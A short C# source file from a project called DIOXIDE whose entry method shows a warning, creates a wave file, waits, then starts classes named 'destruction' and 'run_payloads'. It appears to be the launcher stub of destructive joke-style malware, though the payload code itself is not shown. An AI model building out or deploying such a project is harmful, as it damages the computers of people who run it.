using System;
using System.Threading;
using System.Windows.Forms;
using DIOXIDE.Properties;
using DIOXIDE;

namespace DIOXIDE
{
    class execute
    {
        public static void executeEWP()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();

            destruction.WARNING();

            payloads.CreateWaveFile();

            Thread.Sleep(5000);

            run_payloads.PStart();

            Environment.Exit(0);
        }
    }
}
